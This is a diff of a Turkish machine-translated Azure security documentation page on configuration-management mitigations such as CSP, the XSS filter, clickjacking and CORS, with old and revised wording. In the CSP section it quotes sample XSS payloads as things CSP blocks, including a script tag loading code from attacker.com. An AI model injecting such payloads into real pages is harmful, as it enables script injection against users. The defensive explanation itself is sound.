@@ -1,7 +1,7 @@
 ---
-title: Microsoft Tehdit Modelleme Aracı için yapılandırma yönetimi
+title: Microsoft Threat Modeling Tool için yapılandırma yönetimi
 titleSuffix: Azure
-description: Tehdit Modelleme Aracı'nda açığa çıkan tehditler için azaltıcı etkenler
+description: Threat Modeling Tool kullanıma sunulan tehditler için azaltmaları
 services: security
 documentationcenter: na
 author: jegeib
@@ -16,46 +16,46 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
-ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: MT
 ms.contentlocale: tr-TR
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "81687968"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204262"
 ---
-# <a name="security-frame-configuration-management--mitigations"></a>Güvenlik Çerçevesi: Yapılandırma Yönetimi | Azaltıcı etken 
-| Ürün / Hizmet | Makale |
+# <a name="security-frame-configuration-management--mitigations"></a>Güvenlik çerçevesi: yapılandırma yönetimi | Karşı 
+| Ürün/hizmet | Makale |
 | --------------- | ------- |
-| **Web Uygulaması** | <ul><li>[İçerik Güvenlik İlkesi (CSP) uygulayın ve satır satır lı javascript'i devre dışı](#csp-js)</li><li>[Tarayıcının XSS filtresini etkinleştirme](#xss-filter)</li><li>[ASP.NET uygulamaları, dağıtımdan önce izleme ve hata ayıklamadevre vermemelidir](#trace-deploy)</li><li>[Yalnızca güvenilen kaynaklardan üçüncü taraf javascript'lere erişin](#js-trusted)</li><li>[Kimlik doğrulaması ASP.NET sayfalarının UI Redressing veya click-jacking savunmalarını dahil ettiğinden emin olun](#ui-defenses)</li><li>[ASP.NET Web Uygulamaları'nda CORS etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun](#cors-aspnet)</li><li>[ASP.NET Sayfalarda İstek özniteliğini doğrulamayı etkinleştirme](#validate-aspnet)</li><li>[JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullanma](#local-js)</li><li>[Otomatik MIME koklamayı devre dışı](#mime-sniff)</li><li>[Parmak izini almaktan kaçınmak için Windows Azure Web Sitelerindeki standart sunucu üstbilgilerini kaldırma](#standard-finger)</li></ul> |
-| **Veritabanı** | <ul><li>[Veritabanı Altyapısı erişimi için Windows Güvenlik Duvarı yapılandırma](#firewall-db)</li></ul> |
-| **Web API** | <ul><li>[Cors Web API'ASP.NET etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun](#cors-api)</li><li>[Web API'nin yapılandırma dosyalarının hassas veriler içeren bölümlerini şifreleme](#config-sensitive)</li></ul> |
-| **IoT Cihazı** | <ul><li>[Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun](#admin-strong)</li><li>[Bilinmeyen kodun aygıtlarda yürütülmediğinden emin olun](#unknown-exe)</li><li>[IoT Cihazının işletim sistemi ve ek bölümlerini bit dolabı ile şifreleme](#partition-iot)</li><li>[Cihazlarda yalnızca minimum hizmetlerin/özelliklerin etkin olduğundan emin olun](#min-enable)</li></ul> |
-| **IoT Alan Ağ Geçidi** | <ul><li>[IoT Field Gateway'in işletim sistemi ve ek bölümlerini bit dolabı yla şifreleme](#field-bit-locker)</li><li>[Yükleme sırasında alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin değiştirildiğinden emin olun](#default-change)</li></ul> |
-| **IoT Bulut Ağ Geçidi** | <ul><li>[Bulut Ağ Geçidi'nin bağlı aygıtları güncel tutmak için bir işlem uyguladığından emin olun](#cloud-firmware)</li></ul> |
-| **Makine Güven Sınırı** | <ul><li>[Aygıtların kuruluş ilkelerine göre yapılandırılan son nokta güvenlik denetimlerine sahip olduğundan emin olun](#controls-policies)</li></ul> |
-| **Azure Depolama** | <ul><li>[Azure depolama erişim anahtarlarının güvenli yönetimini sağlayın](#secure-keys)</li><li>[Azure depolama da CORS etkinse yalnızca güvenilen kökenlere izin verildiğini sağlayın](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[WCF'nin hizmet azaltma özelliğini etkinleştirme](#throttling)</li><li>[Meta veriler aracılığıyla WCF-Bilgi açıklaması](#info-metadata)</li></ul> | 
+| **Web uygulaması** | <ul><li>[Içerik Güvenlik Ilkesi (CSP) uygulama ve satır içi JavaScript 'i devre dışı bırakma](#csp-js)</li><li>[Tarayıcının XSS filtresini etkinleştir](#xss-filter)</li><li>[ASP.NET uygulamalar, dağıtımdan önce izlemeyi ve hata ayıklamayı devre dışı bırakmalıdır](#trace-deploy)</li><li>[Yalnızca güvenilir kaynaklardan üçüncü taraf JavaScripts 'e erişin](#js-trusted)</li><li>[Kimliği doğrulanmış ASP.NET sayfalarının UI Redressing veya tıklama-Jacking savunmaları içerdiğinden emin olun](#ui-defenses)</li><li>[CORS 'nin ASP.NET Web uygulamalarında etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun.](#cors-aspnet)</li><li>[ASP.NET sayfalarında ValidateRequest özniteliğini etkinleştirin](#validate-aspnet)</li><li>[JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullan](#local-js)</li><li>[Otomatik MIME algılaması 'nı devre dışı bırak](#mime-sniff)</li><li>[Parmak izi oluşmasını önlemek için Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma](#standard-finger)</li></ul> |
+| **Veritabanınızı** | <ul><li>[Veritabanı altyapısı erişimi için bir Windows Güvenlik Duvarı yapılandırma](#firewall-db)</li></ul> |
+| **Web API** | <ul><li>[ASP.NET Web API 'sinde CORS etkinse yalnızca güvenilir kaynaklardan izin verildiğinden emin olun](#cors-api)</li><li>[Web API 'sinin gizli verileri içeren yapılandırma dosyalarının bölümlerini şifreleyin](#config-sensitive)</li></ul> |
+| **IoT cihazı** | <ul><li>[Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun](#admin-strong)</li><li>[Bilinmeyen kodun cihazlarda yürütülemez olduğundan emin olun](#unknown-exe)</li><li>[Bit dolabı ile işletim sistemi ve IoT cihazının ek bölümlerini şifreleme](#partition-iot)</li><li>[Cihazlarda yalnızca en düşük hizmet/özelliklerin etkinleştirildiğinden emin olun](#min-enable)</li></ul> |
+| **IoT alan ağ geçidi** | <ul><li>[Bit dolabı ile işletim sistemi ve IoT alan ağ geçidinin ek bölümlerini şifreleme](#field-bit-locker)</li><li>[Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun](#default-change)</li></ul> |
+| **IoT bulut ağ geçidi** | <ul><li>[Bulut ağ geçidinin bağlı cihazlar belleniminin güncel tutulması için bir işlem uyguladığından emin olun](#cloud-firmware)</li></ul> |
+| **Makine güven sınırı** | <ul><li>[Cihazların kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun](#controls-policies)</li></ul> |
+| **Azure Storage** | <ul><li>[Azure depolama erişim anahtarlarının güvenli yönetimi sağlama](#secure-keys)</li><li>[CORS 'nin Azure depolamada etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun](#cors-storage)</li></ul> |
+| **WCF** | <ul><li>[WCF 'nin hizmet azaltma özelliğini etkinleştir](#throttling)</li><li>[WCF-meta veriler aracılığıyla bilgilerin açıklanması](#info-metadata)</li></ul> | 
 
-## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>İçerik Güvenlik İlkesi (CSP) uygulayın ve satır satır lı javascript'i devre dışı
+## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Içerik Güvenlik Ilkesi (CSP) uygulama ve satır içi JavaScript 'i devre dışı bırakma
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [İçerik Güvenlik Politikasına Giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [İçerik Güvenlik Politikası Başvurusu](https://content-security-policy.com/), Güvenlik [özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), İçerik [güvenlik politikasına giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Adımlar** | <p>İçerik Güvenlik Politikası (CSP), web uygulama sahiplerinin sitelerine gömülü içerik üzerinde denetim sahibi olmasını sağlayan bir W3C standardı olan derinlemesine bir güvenlik mekanizmasıdır. CSP, web sunucusuna HTTP yanıt başlığı olarak eklenir ve istemci tarafında tarayıcılar tarafından uygulanır. Bu beyaz listeye dayalı bir ilkedir - bir web sitesi, JavaScript gibi etkin içeriğin yüklenebileceği bir dizi güvenilir etki alanı bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS'ye karşı koruma:** Bir sayfa XSS'ye karşı savunmasızsa, saldırgan sayfadan 2 şekilde yararlanabilir:<ul><li>Enjekte `<script>malicious code</script>`edin. Bu yararlanma CSP'nin Temel Kısıtlaması-1 nedeniyle çalışmaz</li><li>Enjekte `<script src="http://attacker.com/maliciousCode.js"/>`edin. Saldırganın denetlenmişetki alanı CSP' nin etki alanları beyaz listesinde yer alamayacağı için bu yararlanma çalışmaz</li></ul></li><li>**Veri sızma üzerinde kontrol:** Bir web sayfasındaki kötü amaçlı içerik harici bir web sitesine bağlanmaya ve veri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP'nin beyaz listesinde olmamasıdır.</li><li>**Tıklama kaçırmaya karşı savunma:** tıklama kaçırma, bir düşmanın gerçek bir web sitesini çerçeveleyip kullanıcıları Kullanıcı Bira öğelerini tıklamaya zorlayarak kullanabileceği bir saldırı tekniğidir. Şu anda tıklama kaçırmaya karşı savunma, yanıt üstbilgisi olan X-Frame-Options'ı yapılandırılarak elde edilir. Tüm tarayıcılar bu üstbilgi saygı ve ileri CSP tıklama-jacking karşı savunmak için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP özellikli bir web sitesinde bir enjeksiyon saldırısı varsa, tarayıcılar web sunucusunda yapılandırılan bir uç noktaya bildirimi otomatik olarak tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi olarak hizmet vermektedir.</li></ul> |
+| **Başvurular**              | İçerik [güvenlik Ilkesine giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Içerik güvenlik ilkesi başvurusu](https://content-security-policy.com/), [güvenlik özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [içerik güvenlik ilkesine giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
+| **Adımlar** | <p>İçerik Güvenlik Ilkesi (CSP), Web uygulaması sahiplerinin sitesinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir W3C standardı olan bir derinlemesine savunma güvenlik mekanizmasıdır. CSP, Web sunucusuna bir HTTP yanıt üst bilgisi olarak eklenir ve tarayıcı tarafından istemci tarafında zorlanır. Bu, beyaz liste tabanlı bir ilkedir. bir Web sitesi, JavaScript gibi etkin içeriklerin yüklenebileceği bir güvenilen etki alanı kümesi bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS 'ye karşı koruma:** Bir sayfa XSS ile savunmasızdır, bir saldırgan bunu 2 şekilde kullanabilir:<ul><li>Ekle `<script>malicious code</script>`. Bu yararlanma, CSP 'nin temel kısıtlaması nedeniyle çalışmayacak-1</li><li>Ekle `<script src="http://attacker.com/maliciousCode.js"/>`. Bu yararlanma, saldırgan tarafından denetlenen etki alanı CSP 'nin beyaz etki alanları listesinde yer almasından bu yana çalışmayacak</li></ul></li><li>**Veri taşalımı üzerinde denetim:** Bir Web sayfasındaki kötü amaçlı içerik bir dış Web sitesine bağlanmaya ve verileri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP 'nin beyaz listesinde olmaması olabilir</li><li>**Tıklama-Jacking 'e karşı savunma:** tıklama-Jacking, bir yöneticinin orijinal bir Web sitesini çerçevelenmesini ve Kullanıcı Arabirimi öğelerine tıklamasını zorunlu kıbir saldırı tekniğidir. Bir yanıt üst bilgisi (X-Frame-Options) yapılandırılarak, şu anda tıklama-Jacking 'e karşı savunma yapılır. Tüm tarayıcılar bu üstbilgiye uymaz ve iletme CSP 'si, tıklama ile ilgili savunmanız için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP etkin bir Web sitesine ekleme saldırısı varsa, tarayıcılar Web sunucusu üzerinde yapılandırılan bir uç noktaya otomatik olarak bir bildirim tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi işlevi görür.</li></ul> |
 
 ### <a name="example"></a>Örnek
 Örnek ilke: 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-Bu ilke, komut dosyalarının yalnızca web uygulamasının sunucusundan ve google analytics sunucusundan yüklenmesine olanak tanır. Başka bir siteden yüklenen komut dosyaları reddedilir. Bir web sitesinde CSP etkinleştirildiğinde, XSS saldırılarını azaltmak için aşağıdaki özellikler otomatik olarak devre dışı bırakılır. 
+Bu ilke, betiklerin yalnızca Web uygulamasının sunucusundan ve Google Analytics sunucusundan yüklenmesine izin verir. Başka herhangi bir siteden yüklenen betikler reddedilir. CSP bir Web sitesinde etkinleştirildiğinde, XSS saldırılarını azaltmak için aşağıdaki özellikler otomatik olarak devre dışı bırakılır. 
 
 ### <a name="example"></a>Örnek
-Satır satırkomut dosyaları yürütülmez. Aşağıda satır satırlı komut dosyaları örnekleri verilmiştir 
+Satır içi betikler yürütülmeyecektir. Satır içi betiklerin örnekleri aşağıda verilmiştir 
 ```javascript
 <script> some Javascript code </script>
 Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
@@ -63,57 +63,57 @@ javascript:alert(1);
 ```
 
 ### <a name="example"></a>Örnek
-Dizeleri kod olarak değerlendirilmeyecektir. 
+Dizeler kod olarak değerlendirilmeyecektir. 
 ```javascript
 Example: var str="alert(1)"; eval(str);
 ```
 
-## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Tarayıcının XSS filtresini etkinleştirme
+## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Tarayıcının XSS filtresini etkinleştir
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [XSS Koruma Filtresi](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
-| **Adımlar** | <p>X-XSS-Protection yanıt üstbilgisi yapılandırması tarayıcının site ler arası komut dosyası filtresini denetler. Bu yanıt üstbilgiaşağıdaki değerlere sahip olabilir:</p><ul><li>`0:`Bu, filtreyi devre dışı</li><li>`1: Filter enabled`Bir site arası komut dosyası saldırısı algılanırsa, saldırıyı durdurmak için tarayıcı sayfayı temizler</li><li>`1: mode=block : Filter enabled`. Sayfayı dezenfekte etmek yerine, bir XSS saldırısı algılandığında, tarayıcı sayfanın görüntülanmasını önler</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Tarayıcı sayfayı dezenfekte eder ve ihlali bildirir.</li></ul><p>Bu, seçtiğiniz bir URI'ye ayrıntıları göndermek için CSP ihlal raporlarını kullanan bir Krom işlevidir. Son 2 seçenek güvenli değerler olarak kabul edilir.</p>|
+| **Başvurular**              | [XSS koruma filtresi](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
+| **Adımlar** | <p>X-XSS-koruma yanıt üst bilgisi yapılandırması tarayıcının siteler arası betik filtresini denetler. Bu yanıt üst bilgisinde aşağıdaki değerler olabilir:</p><ul><li>`0:`Bu, filtreyi devre dışı bırakacak</li><li>`1: Filter enabled`Bir siteler arası betik saldırı algılanırsa, saldırıları durdurmak için tarayıcı sayfayı temizler</li><li>`1: mode=block : Filter enabled`. Sayfayı temizleme yerine, bir XSS saldırısı algılandığında, tarayıcı sayfanın işlenmesini engeller</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Tarayıcı sayfayı temizler ve ihlalin rapor eder.</li></ul><p>Bu, ayrıntıları seçtiğiniz bir URI 'ye göndermek için CSP ihlali raporlarının kullanıldığı bir Kmıum işlevidir. Son 2 seçenek, güvenli değerler olarak kabul edilir.</p>|
 
-## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET uygulamaları, dağıtımdan önce izleme ve hata ayıklamadevre vermemelidir
+## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET uygulamalar, dağıtımdan önce izlemeyi ve hata ayıklamayı devre dışı bırakmalıdır
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [ASP.NET Hata Ayıklama Genel Bakış](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.NET İzleme Genel Bakış](https://msdn.microsoft.com/library/bb386420.aspx), [Nasıl: ASP.NET Bir Uygulama için İzleme etkinleştirin](https://msdn.microsoft.com/library/0x5wc973.aspx), [Nasıl: ASP.NET Uygulamaları için Hata Ayıklama etkinleştirin](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
-| **Adımlar** | Sayfa için izleme etkinleştirildiğinde, sayfayı isteyen her tarayıcı, iç sunucu durumu ve iş akışı hakkında veri içeren izleme bilgilerini de elde eder. Bu bilgi güvenliğe duyarlı olabilir. Sayfa için hata ayıklama etkinleştirildiğinde, sunucuda meydana gelen hatalar, tarayıcıya sunulan tam yığın izleme verilerine neden olur. Bu veriler, sunucunun iş akışı hakkında güvenliğe duyarlı bilgileri açığa çıkarabilir. |
+| **Başvurular**              | [ASP.NET hata ayıklamaya genel bakış](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.net izlemeye genel bakış](https://msdn.microsoft.com/library/bb386420.aspx), [nasıl yapılır: bir ASP.NET uygulaması için izlemeyi etkinleştirme](https://msdn.microsoft.com/library/0x5wc973.aspx), [nasıl yapılır: ASP.NET uygulamaları için hata ayıklamayı etkinleştirme](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Adımlar** | Sayfa için izleme etkinleştirildiğinde, istenen her tarayıcı, iç sunucu durumu ve iş akışı hakkındaki verileri içeren izleme bilgilerini de alır. Bu bilgiler güvenliğe duyarlı olabilir. Sayfada hata ayıklama etkinleştirildiğinde, sunucuda meydana gelen hatalar tarayıcıya sunulan tam yığın izleme verileriyle sonuçlanır. Bu veriler, sunucunun iş akışıyla ilgili güvenliğe duyarlı bilgiler açığa çıkabilir. |
 
-## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Yalnızca güvenilen kaynaklardan üçüncü taraf javascript'lere erişin
+## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Yalnızca güvenilir kaynaklardan üçüncü taraf JavaScripts 'e erişin
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | üçüncü taraf JavaScript'ler yalnızca güvenilir kaynaklardan başvurulmalıdır. Başvuru uç noktaları her zaman SSL üzerinde olmalıdır. |
+| **Adımlar** | üçüncü taraf JavaScripts 'e yalnızca güvenilir kaynaklardan başvurulmalıdır. Başvuru uç noktaları her zaman TLS üzerinde olmalıdır. |
 
-## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Kimlik doğrulaması ASP.NET sayfalarının UI Redressing veya click-jacking savunmalarını dahil ettiğinden emin olun
+## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Kimliği doğrulanmış ASP.NET sayfalarının UI Redressing veya tıklama-Jacking savunmaları içerdiğinden emin olun
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Genel |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
-| **Başvurular**              | [OWASP click-jacking Savunma Hile Sayfası](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Dahili - X-Frame-Options ile tıklama jacking mücadele](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
-| **Adımlar** | <p>"Kullanıcı geri alma saldırısı" olarak da bilinen tıklama kaçırma, bir saldırganın kullanıcıyı üst düzey sayfaya tıklamayı planladıkları sırada başka bir sayfadaki bir düğmeye veya bağlantıyı tıklatması için kandırmak için birden çok saydam veya opak katman kullanmasıdır.</p><p>Bu katmanlama, kurbanın sayfasını yükleyen bir iframe ile kötü amaçlı bir sayfa oluşturarak elde edilir. Bu nedenle, saldırgan kendi sayfası için direnen tıklamaları "kaçırmak" ve büyük olasılıkla başka bir uygulama, etki alanı veya her ikisine ait başka bir sayfaya yönlendirme. Tıklama kaçırma saldırılarını önlemek için, tarayıcıya diğer etki alanlarından çerçevelemeye izin vermemelerini söyleyen uygun X-Frame-Options HTTP yanıt üstbilgisini ayarlayın</p>|
+| **Başvurular**              | [OWASP tıklama-Yiyilmez savunma sayfası](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Iç Işlevleri-combating tıklama-X-Frame-Options ile çarpıcı](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **Adımlar** | <p>"UI Redress saldırısı" olarak da bilinen tıklama, bir saldırgan, bir kullanıcının bir düğmeye tıklamasını sağlamak için birden çok saydam veya donuk katman kullandığında, en üst düzey sayfaya tıklandıklarında, başka bir sayfada bulunan bir düğmeye veya bağlantıya tıklamasını sağlar.</p><p>Bu katman, kurban 'in sayfasını yükleyen bir iframe ile kötü amaçlı bir sayfa taslağı oluşturarak elde edilir. Bu nedenle, saldırgan, kendi sayfaları için amaçlanan ' ı tıklatır ve büyük olasılıkla başka bir uygulamaya, etki alanına veya her ikisine de sahip olan başka bir sayfaya yönlendirilir. Tıklama saldırılarına karşı saldırıları engellemek için, tarayıcıyı diğer etki alanlarından çerçeveleme 'ye izin vermamasını sağlayan uygun X-çerçeve seçenekleri HTTP yanıt üst bilgilerini ayarlayın</p>|
 
 ### <a name="example"></a>Örnek
-X-FRAME-OPTIONS üstbilgisi IIS web.config üzerinden ayarlanabilir. Web.config kodu çerçeveli asla siteler için snippet: 
+X-FRAME-OPTIONS üst bilgisi IIS Web. config aracılığıyla ayarlanabilir. Hiçbir şekilde çerçeveli olmayan siteler için Web. config kod parçacığı: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -125,7 +125,7 @@ X-FRAME-OPTIONS üstbilgisi IIS web.config üzerinden ayarlanabilir. Web.config 
 ```
 
 ### <a name="example"></a>Örnek
-Yalnızca aynı etki alanında sayfalar tarafından çerçevelenmiş olması gereken siteler için Web.config kodu: 
+Yalnızca aynı etki alanındaki sayfalara göre çerçevelenmiş siteler için Web. config kodu: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -136,19 +136,19 @@ Yalnızca aynı etki alanında sayfalar tarafından çerçevelenmiş olması ger
     </system.webServer>
 ```
 
-## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>ASP.NET Web Uygulamaları'nda CORS etkinse yalnızca güvenilen kökenlere izin verildiğinden emin olun
+## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>CORS 'nin ASP.NET Web uygulamalarında etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun.
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Web Formları, MVC5 |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Web Forms, MVC5 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
-| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlama ya aynı kaynak ilkesi olarak adlandırılır ve kötü amaçlı bir sitenin başka bir siteden gelen hassas verileri okumasını engeller. Ancak, bazen diğer sitelerin tüketebileceği API'leri güvenli bir şekilde ortaya çıkarmak gerekebilir. Cross Origin Kaynak Paylaşımı (CORS), bir sunucunun aynı kaynak ilkesini gevşetmesine olanak tanıyan bir W3C standardıdır. CORS'i kullanan sunucu, diğerlerini reddederken bazı kişiler arası isteklere açıkça izin verebilir.</p><p>CORS, JSONP gibi önceki tekniklere göre daha güvenli ve daha esnektir. Özünde, CORS etkinleştirme web uygulamasına birkaç HTTP yanıt başlıkları (Access-Control-*) ekleyerek çevirir ve bu birkaç şekilde yapılabilir.</p>|
+| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlamaya aynı-Origin ilkesi adı verilir ve kötü amaçlı bir sitenin başka bir siteden hassas verileri okumasını önler. Ancak bazen diğer sitelerin tüketebileceği API 'Leri güvenli hale getirmek gerekebilir. Çapraz kaynak kaynak paylaşımı (CORS), bir sunucunun aynı kaynak ilkeyi rahat bir şekilde sağlamasına olanak tanıyan bir W3C standardıdır. CORS kullanarak, bir sunucu bazı çapraz kaynak isteklerine, diğerlerini reddetirken açık bir şekilde izin verebilir.</p><p>CORS, JSONP gibi önceki tekniklerin daha güvenli ve daha esnektir. Bu uygulamada, CORS 'nin etkinleştirilmesi Web uygulamasına birkaç HTTP yanıt üst bilgisi (Access-Control-*) ekleme ve bu işlem birkaç yolla yapılabilir.</p>|
 
 ### <a name="example"></a>Örnek
-Web.config erişimi varsa, cors aşağıdaki kod aracılığıyla eklenebilir: 
+Web. config dosyasına erişim varsa, CORS aşağıdaki kodla eklenebilir: 
 ```XML
 <system.webServer>
     <httpProtocol>
@@ -160,30 +160,30 @@ Web.config erişimi varsa, cors aşağıdaki kod aracılığıyla eklenebilir:
 ```
 
 ### <a name="example"></a>Örnek
-web.config erişimi yoksa, cors aşağıdaki CSharp kodu ekleyerek yapılandırılabilir: 
+Web. config dosyasına erişim yoksa, CORS aşağıdaki CSharp kodu eklenerek yapılandırılabilir: 
 ```csharp
 HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
-"Access-Control-Allow-Allow-Origin" özniteliğindeki kaynak listesinin sınırlı ve güvenilir bir menşe kümesine ayarlandığından emin olmak için önemli olduğunu lütfen unutmayın. Bunu uygunsuz bir şekilde yapılandırılamaması (örneğin, değeri '*' olarak ayarlamak), kötü amaçlı sitelerin web uygulamasına çapraz menşe isteklerini herhangi bir kısıtlama olmaksızın >tetiklemesine ve böylece uygulamayı CSRF saldırılarına karşı savunmasız hale getirecektir. 
+"Erişim-denetim-Izin-Origin" özniteliğinde bulunan çıkış listesinin sonlu ve güvenilir bir kaynak kümesine ayarlandığından emin olmak için kritik olduğunu unutmayın. Bu uygun olmayan yapılandırma (ör. değeri ' * ' olarak ayarlamak) kötü amaçlı sitelerin web >uygulamasına çapraz kaynak isteklerini tetiklemesine izin verir ve bu sayede uygulama CSRF saldırılarına karşı savunmasız hale gelir. 
 
-## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>ASP.NET Sayfalarda İstek özniteliğini doğrulamayı etkinleştirme
+## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>ASP.NET sayfalarında ValidateRequest özniteliğini etkinleştirin
 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL Fazı**               | Yapı |  
-| **Uygulanabilir Teknolojiler** | Web Formları, MVC5 |
+| **SDL aşaması**               | Yapı |  
+| **İlgili teknolojiler** | Web Forms, MVC5 |
 | **Öznitelikler**              | Yok  |
